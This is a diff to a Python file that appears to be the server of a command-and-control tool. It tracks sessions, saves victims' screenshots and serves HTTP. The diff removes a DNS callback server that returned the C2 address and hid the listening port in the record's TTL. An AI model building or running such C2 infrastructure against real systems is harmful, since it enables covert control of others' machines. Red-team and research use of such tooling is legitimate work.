@@ -9,13 +9,6 @@ import time
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import tempfile
 
-# For initial callbacks via DNS
-from dnslib import *
-from dnslib.server import DNSServer, BaseResolver, DNSLogger
-
-# For debugging
-#import pdb
-
 # Globals to keep track of sessions and session data
 sessions          = {'0':0}
 session_queues    = {'0':queue.Queue()}
@@ -34,33 +27,6 @@ def bmp(data):
         return f.name
     except Exception as e:
         return f"Error saving screenshot: {e}"
-
-# For DNS
-class CustomResolver(BaseResolver):
-    def __init__(self, a_record, cname_record):
-        self.a_record = a_record
-        self.cname_record = cname_record
-
-    def resolve(self, request, handler):
-        global C2_LISTEN_PORT
-        reply = request.reply()
-        qname = request.q.qname
-        qtype = request.q.qtype
-        #pdb.set_trace()
-
-        if qtype == QTYPE.A:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.a_record), ttl=C2_LISTEN_PORT))
-        elif qtype == QTYPE.CNAME:
-            reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(self.cname_record), ttl=60))
-
-        return reply
-
-def dns_server(a_record, cname_record, listen_address="0.0.0.0"):
-    resolver = CustomResolver(a_record, cname_record)
-    logger = DNSLogger(log="truncated,error")
-
-    server = DNSServer(resolver, port=53, address=listen_address, logger=logger)
-    server.start_thread()
 
 class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -187,8 +153,6 @@ if __name__ == "__main__":
  / _ `// _ \ / // _  // -_)/ _ \/ _ `// _ \/ _ \ (_-</ -_)
  \_, / \___//_/ \_,_/ \__//_//_/\_, / \___/\___//___/\__/ 
 /___/                          /___/                      """)
-    
-    dns_server(C2_LISTEN_ADDR, "")
     
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
